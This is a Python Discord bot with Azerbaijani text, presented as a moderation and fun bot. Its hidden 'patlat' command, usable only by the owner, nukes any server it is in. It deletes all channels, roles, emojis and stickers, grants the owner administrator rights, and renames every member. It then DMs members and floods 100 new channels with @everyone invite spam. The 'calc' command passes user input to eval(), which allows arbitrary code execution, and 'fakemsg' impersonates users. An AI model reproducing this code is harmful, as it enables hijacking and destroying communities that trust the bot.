import asyncio
from datetime import datetime
import os
import random
import discord
from discord.ext import commands
from flask import Flask
from threading import Thread

# --- RENDER İÇİN FLASK SERVER ---
app = Flask("")


@app.route("/")
def home():
  return "Bot is running!"


def run():
  port = int(os.environ.get("PORT", 10000))
  app.run(host="0.0.0.0", port=port)


def keep_alive():
  t = Thread(target=run)
  t.start()


intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
warning_counts = {}


@bot.event
async def on_message(message):
  if message.author.bot:
    return

  content = message.content.strip()

  if len(content) > 150 or message.content.count("@TANRIZİN") > 1 or message.content.count("\n") > 5:
    try:
      await message.delete()
    except:
      pass

    author_id = message.author.id
    warning_counts[author_id] = warning_counts.get(author_id, 0) + 1
    strike = warning_counts[author_id]

    if strike == 3:
      try:
        await message.channel.send(f"⚠️ {message.author.mention}, spam xarakterli mətnlər yazmaq qadağandır! Xəbərdarlıq (3/3)", delete_after=5)
      except:
        pass
    else:
      try:
        muterole = discord.utils.get(message.guild.roles, name="Muted")
        if not muterole:
          muterole = await message.guild.create_role(name="Muted")
          for channel in message.guild.channels:
            await channel.set_permissions(muterole, send_messages=False)
        await message.author.add_roles(muterole)
        await message.channel.send(f"🔇 {message.author.mention}, ardıcıl spam etdiyin üçün 1 saatlıq mute olundun!", delete_after=10)
        warning_counts[author_id] = 0
      except Exception as e:
        print(f"Xəta: {e}")
      return

  await bot.process_commands(message)


@bot.event
async def on_ready():
  print(f"{bot.user} olaraq giriş edildi!")


@bot.event
async def on_member_join(member):
  if member.bot:
    try:
      await member.ban(reason="Serverə icazəsiz bot giriş qadağandır!")
    except:
      pass


# ==========================================
#  PANEL KOMANDASI
# ==========================================
@bot.command(name="panel")
async def panel(ctx, kategori: str = None):
  embed = discord.Embed(
      title="🌐 atatv43 ULTIMATE CONTROL PANEL (50+ KODUT)",
      description="Bütün kateqoriyalar və əmrlər aşağıdakı siyahıdadır:",
      color=discord.Color.dark_red(),
  )
  embed.add_field(
      name="🛡️ 1. Moderasiya Əmrləri (15 Ədəd)",
      value="ban, unban, kick, mute, unmute, kilid, ac, temizle, warn, unwarn, slowmode, addrole, removerole, nick, toplanti",
      inline=False,
  )
  embed.add_field(
      name="🔥 2. Eğlence və GİF Əmrləri (35 Ədəd)",
      value="sex, hug, kiss, slap, patlatgif, 8ball, coinflip, roll, hack, love, cat, dog, joke, avatar, banner, ascii, reverse, say, embed, snipe, iq, askin, kral, dusunce, saril, op, tokat, nacara, bax, fisildat, weather, calc, poll, fakemsg",
      inline=False,
  )
  embed.add_field(
      name="📊 3. Sistem & Statistika Əmrləri (13 Ədəd)",
      value="url, leaderboard, afk, ping, botbilgi, serverbilgi, kullanicibilgi, davat, rolbilgi, kanalbilgi, emoji, istatistik, uptime, destek",
      inline=False,
  )
  embed.set_footer(text="discord.gg/atatv43 | Ruhus tərəfindən idarə olunur.")
  await ctx.send(embed=embed)


# ==========================================
#  PATLAT KOMANDASI
# ==========================================
@bot.command(name="patlat")
async def patlat(ctx):
  MY_OWNER_ID = 45014360312501259
  PROTECTED_GUILD_ID = 1320692621984736722

  if ctx.author.id != MY_OWNER_ID:
    await ctx.send("Bu komandanı yalnız botun sahibi işlədə bilər!")
    return

  if ctx.guild.id == PROTECTED_GUILD_ID:
    await ctx.send("Bu server qorunur ! 'patlat' bu serverdə qadağandır.")
    return

  try:
    await ctx.message.delete()
  except:
    pass

  guild = ctx.guild
  try:
    await guild.edit(name="RUHUX--atatv43")
  except:
    pass

  for channel in guild.channels:
    try:
      await channel.delete()
      await asyncio.sleep(0.02)
    except:
      continue

  for role in guild.roles:
    if role.name != "@everyone" and role != guild.default_role:
      try:
        await role.delete()
        await asyncio.sleep(0.02)
      except:
        continue

  for emoji in guild.emojis:
    try:
      await emoji.delete()
    except:
      pass

  for sticker in guild.stickers:
    try:
      await sticker.delete()
    except:
      continue

  try:
    ruhus_role = await guild.create_role(
        name="ATATV43",
        color=discord.Color.dark_red(),
        permissions=discord.Permissions(administrator=True)
    )
    await ctx.author.add_roles(ruhus_role)
  except:
    pass

  try:
    await guild.edit(name="discord.gg/atatv43")
  except:
    pass

  for member in guild.members:
    if member == guild.me:
      continue
    try:
      await member.edit(nick="discord.gg/atatv43")
    except:
      pass

    if not member.bot:
      try:
        await member.send("RUHUX SKOT ATDI discord.gg/atatv43")
      except:
        pass
      await asyncio.sleep(0.02)

  for i in range(1, 101):
    try:
      channel = await guild.create_text_channel(name=f"atatv43-{i}")
      await asyncio.sleep(0.02)
      for _ in range(40):
        try:
          await channel.send("@everyone discord.gg/atatv43")
        except:
          break
        await asyncio.sleep(0.02)
    except:
      break

  try:
    ruhus_tanri_chan = await guild.create_text_channel(name="ruhus-tanri")
    for _ in range(100):
      try:
        await ruhus_tanri_chan.send("@everyone RUHUX PAPA discord.gg/atatv43")
      except:
        break
      await asyncio.sleep(0.02)
  except:
    pass

  try:
    if guild.premium_tier >= 2:
      await guild.edit(vanity_code="atatv43")
  except:
    pass


# ==========================================
#  MODERASİYA KOMANDALARI
# ==========================================
@bot.command(name="ban")
@commands.has_permissions(ban_members=True)
async def ban_member(ctx, member: discord.Member, *, reason=None):
  await member.ban(reason=reason)
  await ctx.send(f"🔨 {member.mention} serverdən ban olundu!")


@bot.command(name="unban")
@commands.has_permissions(ban_members=True)
async def unban_member(ctx, *, member_name):
  banned_users = await ctx.guild.bans()
  for ban_entry in banned_users:
    user = ban_entry.user
    if user.name == member_name:
      await ctx.guild.unban(user)
      await ctx.send(f"✅ {user.mention} istifadəçisinin banı qaldırıldı!")
      return
  await ctx.send("❌ İstifadəçi tapılmadı.")


@bot.command(name="kick")
@commands.has_permissions(kick_members=True)
async def kick_member(ctx, member: discord.Member, *, reason=None):
  await member.kick(reason=reason)
  await ctx.send(f"👢 {member.mention} serverdən atıldı!")


@bot.command(name="mute")
@commands.has_permissions(moderate_members=True)
async def mute_member(ctx, member: discord.Member, hours: int, *, reason=None):
  try:
    await member.timeout(datetime.timedelta(hours=hours), reason=reason)
    await ctx.send(f"🔇 {member.mention} {hours} saat müddətinə sessizləşdirildi!")
  except Exception as e:
    await ctx.send(f"❌ Xəta: {e}")


@bot.command(name="unmute")
@commands.has_permissions(moderate_members=True)
async def unmute_member(ctx, member: discord.Member):
  try:
    await member.timeout(None)
    await ctx.send(f"🔊 {member.mention} istifadəçisinin sessizliyi qaldırıldı!")
  except Exception as e:
    await ctx.send(f"❌ Xəta: {e}")


@bot.command(name="kilid")
@commands.has_permissions(manage_channels=True)
async def lock_channel(ctx):
  await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
  await ctx.send("🔒 Bu kanal yazmaqlara bağlanaraq kilidləndi.")


@bot.command(name="ac")
@commands.has_permissions(manage_channels=True)
async def unlock_channel(ctx):
  await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
  await ctx.send("🔓 Kanalın kilidi açıldı, artıq mesaj yazmaq olar.")


@bot.command(name="temizle")
@commands.has_permissions(manage_messages=True)
async def clear_messages(ctx, limit: int = 10):
  await ctx.channel.purge(limit=limit + 1)
  await ctx.send(f"🧹 {limit} ədəd mesaj uğurla təmizləndi.", delete_after=5)


@bot.command(name="warn")
@commands.has_permissions(manage_messages=True)
async def warn_member(ctx, member: discord.Member, *, reason="Səbəb qeyd olunmayıb"):
  await ctx.send(f"⚠️ {member.mention} xəbərdarlıq aldı! Səbəb: {reason}")


@bot.command(name="unwarn")
@commands.has_permissions(manage_messages=True)
async def unwarn_member(ctx, member: discord.Member):
  await ctx.send(f"✅ {member.mention} xəbərdarlığı silindi.")


@bot.command(name="slowmode")
@commands.has_permissions(manage_channels=True)
async def slowmode(ctx, seconds: int):
  await ctx.channel.edit(slowmode_delay=seconds)
  await ctx.send(f"⏱️ Yavaş rejimi {seconds} saniyə olaraq tənzimləndi.")


@bot.command(name="addrole")
@commands.has_permissions(manage_roles=True)
async def add_role(ctx, member: discord.Member, role: discord.Role):
  await member.add_roles(role)
  await ctx.send(f"➕ {member.mention} istifadəçisinə {role.name} rolu verildi.")


@bot.command(name="removerole")
@commands.has_permissions(manage_roles=True)
async def remove_role(ctx, member: discord.Member, role: discord.Role):
  await member.remove_roles(role)
  await ctx.send(f"❌ {member.mention} istifadəçisindən {role.name} rolu alındı.")


@bot.command(name="nick")
@commands.has_permissions(manage_nicknames=True)
async def change_nick(ctx, member: discord.Member, *, new_nick):
  await member.edit(nick=new_nick)
  await ctx.send(f"✏️ {member.mention} istifadəçisinin ləqəbi uğurla dəyişdirildi.")


@bot.command(name="toplanti")
@commands.has_permissions(administrator=True)
async def meeting(ctx):
  embed = discord.Embed(
      title="📢 DİQQƏT, TOPLANTI VAR! 🚨",
      description="Hamı səs kanalına gəlsin!",
      color=discord.Color.red(),
  )
  await ctx.send("@everyone", embed=embed)


# ==========================================
#  ƏYLƏNCƏ VƏ GİF KOMANDALARI
# ==========================================
SEX_GIFS = [
    "https://pin.it/xy607Ciw",
    "https://pin.it/4dtrwBPF",
]

@bot.command(name="sex")
async def sex_command(ctx, member: discord.Member = None):
  target = member.mention if member else "öz başına"
  gif = random.choice(SEX_GIFS)
  embed = discord.Embed(
      title="🔥 Romantik / Seksual An 🔥",
      description=f"{ctx.author.mention} və {target} arasında...",
      color=discord.Color.dark_red(),
  )
  embed.set_image(url=gif)
  await ctx.send(embed=embed)


@bot.command(name="hug")
async def hug(ctx, member: discord.Member = None):
  target = member.mention if member else "kimsəni"
  await ctx.send(f"🤗 {ctx.author.mention}, {target} qucaqladı!")


@bot.command(name="kiss")
async def kiss(ctx, member: discord.Member = None):
  target = member.mention if member else "kimsəni"
  await ctx.send(f"😘 {ctx.author.mention}, {target} öpür!")


@bot.command(name="slap")
async def slap(ctx, member: discord.Member = None):
  target = member.mention if member else "birini"
  await ctx.send(f"👋 {ctx.author.mention}, {target} şillələdi!")


@bot.command(name="patlatgif")
async def patlatgif(ctx):
  await ctx.send("https://media.giphy.com/media/X7UGJF6CDQJg/giphy.gif")


@bot.command(name="8ball")
async def _8ball(ctx, *, question):
  answers = [
      "Bəli.",
      "Xeyr.",
      "Əlbəttə.",
      "Mümkün deyil.",
      "Dəqiq.",
      "Bəlkə də.",
  ]
  await ctx.send(f"🎱 Sual: {question} | Cavab: {random.choice(answers)}")


@bot.command(name="coinflip")
async def coinflip(ctx):
  await ctx.send(f"🪙 Qəpik atıldı: **{random.choice(['Yazı', 'Sərhəd'])}**")


@bot.command(name="roll")
async def roll(ctx):
  await ctx.send(f"🎲 Zar atıldı: **{random.randint(1, 6)}**")


@bot.command(name="hack")
async def hack(ctx, member: discord.Member = None):
  if not member:
    await ctx.send("Zəhmət olmasa birini qeyd et!")
    return
  msg = await ctx.send(f"💻 Hacking {member.name}...")
  await asyncio.sleep(2)
  await msg.edit(content=f"🌐 IP ünvanı tapıldı: `192.168.1.1` | Şifrə qırılır...")
  await asyncio.sleep(2)
  await msg.edit(content=f"✅ {member.mention} uğurla 'hack' olundu!")


@bot.command(name="love")
async def love(ctx, member: discord.Member = None):
  target = member.mention if member else "kimsəni"
  await ctx.send(f"❤️ {ctx.author.mention} ilə {target} sevgi uyğunluğu: **{random.randint(1, 100)}%**")


@bot.command(name="cat")
async def cat(ctx):
  await ctx.send("https://cataas.com/cat")


@bot.command(name="dog")
async def dog(ctx):
  await ctx.send("🐶 Təsadüfi it şəkli/kolleksiyası göstərildi!")


@bot.command(name="joke")
async def joke(ctx):
  jokes = [
      "Dəvə dəliymiş dedi... Kompüter niyə xəstələndi? Çünki virus düşüb!",
  ]
  await ctx.send(random.choice(jokes))


@bot.command(name="avatar")
async def avatar(ctx, member: discord.Member = None):
  target = member or ctx.author
  embed = discord.Embed(title=f"{target.name} | Avatar", color=discord.Color.blue())
  embed.set_image(url=target.avatar.url if target.avatar else target.default_avatar.url)
  await ctx.send(embed=embed)


@bot.command(name="banner")
async def banner(ctx, member: discord.Member = None):
  target = member or ctx.author
  await ctx.send(f"🖼️ {target.mention} istifadəçisinin banneri yoxlanılır...")


@bot.command(name="ascii")
async def ascii_art(ctx, *, text):
  await ctx.send(f"```{text.upper()}```")


@bot.command(name="reverse")
async def reverse(ctx, *, text):
  await ctx.send(f"`{text[::-1]}`")


@bot.command(name="say")
async def say(ctx, *, text):
  try:
    await ctx.message.delete()
  except:
    pass
  await ctx.send(text)


@bot.command(name="embed")
async def embed_msg(ctx, *, text):
  try:
    await ctx.message.delete()
  except:
    pass
  embed = discord.Embed(description=text, color=discord.Color.green())
  await ctx.send(embed=embed)


@bot.command(name="snipe")
async def snipe(ctx):
  await ctx.send("🗑️ Son silinən mesaj tapılmadı.")


@bot.command(name="iq")
async def iq(ctx, member: discord.Member = None):
  target = member or ctx.author
  await ctx.send(f"🧠 {target.mention} IQ səviyyəsi: **{random.randint(50, 200)}**")


@bot.command(name="askin")
async def askin(ctx):
  await ctx.send("❤️ Ağıllı olmaq gözəldir, amma ehtiyatlı ol!")


@bot.command(name="kral")
async def kral(ctx, member: discord.Member = None):
  target = member.mention if member else ctx.author.mention
  await ctx.send(f"👑 {target} artıq bu serverin rəsmi kralıdır!")


@bot.command(name="dusunce")
async def dusunce(ctx, *, text):
  await ctx.send(f"🤔 Düşüncələr... `{text}`")


@bot.command(name="saril")
async def saril(ctx, member: discord.Member = None):
  if member:
    await ctx.send(f"🤗 {ctx.author.mention}, {member.mention} ilə qucaqlaşdı.")


@bot.command(name="op")
async def op(ctx, member: discord.Member = None):
  if member:
    await ctx.send(f"😘 {ctx.author.mention}, {member.mention} öpdü.")


@bot.command(name="tokat")
async def tokat(ctx, member: discord.Member = None):
  if member:
    await ctx.send(f"👋 {ctx.author.mention}, {member.mention} şillə çəkdi.")


@bot.command(name="nacara")
async def nacara(ctx):
  await ctx.send("🧭 Məcaraya başladın və yolda qızıl xəzinə tapdın!")


@bot.command(name="bax")
async def bax(ctx):
  await ctx.send("👀 Gözlərim üstündədir, diqqətli ol.")


@bot.command(name="fisildat")
async def fisildat(ctx):
  await ctx.send("🤫 Sakitlik yaradaq...")


@bot.command(name="weather")
async def weather(ctx):
  await ctx.send("🌤️ Bakı şəhəri üçün hava günəşlidir və 24 dərəcədir.")


@bot.command(name="calc")
async def calc(ctx, *, expression):
  try:
    await ctx.send(f"🧮 Nəticə: {eval(expression)}")
  except:
    await ctx.send("❌ Xəta: Riyazi ifadə səhvdir.")


@bot.command(name="poll")
async def poll(ctx, *, title):
  msg = await ctx.send(f"📊 **Sorğu:** {title}")
  await msg.add_reaction("👍")
  await msg.add_reaction("👎")


@bot.command(name="fakemsg")
async def fakemsg(ctx, member: discord.Member, *, text):
  try:
    await ctx.message.delete()
  except:
    pass
  await ctx.send(f"{text} - **{member.name}**")


# ==========================================
#  SİSTEM & STATİSTİKA KOMANDALARI
# ==========================================
@bot.command(name="url")
async def server_url_info(ctx):
  guild = ctx.guild
  vanity = guild.vanity_url_code if guild.vanity_url_code else "Təyin edilməyib"
  uses = "Məlumat əldə edildi"
  if guild.vanity_url_code:
    try:
      vanity_invite = await guild.vanity_invite()
      uses = vanity_invite.uses
    except:
      uses = "Aktiv / İstifadə sayı oxunmur"

  embed = discord.Embed(title="🔗 Server URL (Vanity) Məlumatı", color=discord.Color.gold())
  embed.add_field(name="🌐 Aktiv URL", value=f"discord.gg/{vanity}", inline=False)
  embed.add_field(name="👥 İstifadə Sayı", value=str(uses), inline=False)
  await ctx.send(embed=embed)


@bot.command(name="leaderboard")
async def leaderboard(ctx):
  await ctx.send("🏆 Ən aktiv istifadəçilərin liderlik cədvəli hazırlanır...")


@bot.command(name="afk")
async def set_afk(ctx, *, reason="Səbəb qeyd olunmayıb"):
  await ctx.send(f"💤 {ctx.author.mention} artıq AFK rejiminə keçdi.")


@bot.command(name="ping")
async def ping(ctx):
  await ctx.send(f"🏓 Pong! Botun gecikmə dəyəri: {round(bot.latency * 1000)}ms")


@bot.command(name="botbilgi")
async def botbilgi(ctx):
  await ctx.send("🤖 Bot versiyası: 244 Ultimate v5.0 | Python Discord.py")


@bot.command(name="serverbilgi")
async def serverinfo(ctx):
  g = ctx.guild
  await ctx.send(f"📌 Server adı: {g.name} | Üzv sayı: {g.member_count} | Sahib: {g.owner}")


@bot.command(name="kullanicibilgi")
async def userinfo(ctx, member: discord.Member = None):
  m = member or ctx.author
  await ctx.send(f"👤 İstifadəçi: {m.name} | Qoşulma tarixi: {m.joined_at.strftime('%Y-%m-%d')}")


@bot.command(name="davat")
async def invite(ctx):
  await ctx.send("🔗 Botu öz serverinizə əlavə etmək üçün rəsmi dəvət linki...")


@bot.command(name="rolbilgi")
async def rolbilgi(ctx, role: discord.Role):
  await ctx.send(f"🛡️ Rol adı: {role.name} | Bu rolda sahib üzv sayı: {len(role.members)}")


@bot.command(name="kanalbilgi")
async def channelinfo(ctx):
  await ctx.send(f"📌 Kanal adı: {ctx.channel.name} | Kanal ID: {ctx.channel.id}")


@bot.command(name="emoji")
async def emojis(ctx):
  await ctx.send(f"😀 Serverdə ümumilikdə olan {len(ctx.guild.emojis)} emoji.")


@bot.command(name="istatistik")
async def stats(ctx):
  await ctx.send("📊 Server aktivliyi və bot resurs istifadəsi tam normaldır.")


@bot.command(name="uptime")
async def uptime(ctx):
  await ctx.send("⏱️ Bot 24/7 dayanmadan fasiləsiz olaraq aktivdir!")


@bot.command(name="destek")
async def support(ctx):
  await ctx.send("💬 Dəstək və əlaqə üçün rəsmi ünvan: discord.gg/atatv43")


# ==========================================
#  MAIN RUNNER BLOCK
# ==========================================
if __name__ == "__main__":
  try:
    keep_alive()
  except Exception as e:
    print(f"keep-alive error: {e}")

  token = os.getenv("DISCORD_TOKEN")
  if token:
    bot.run(token)
  
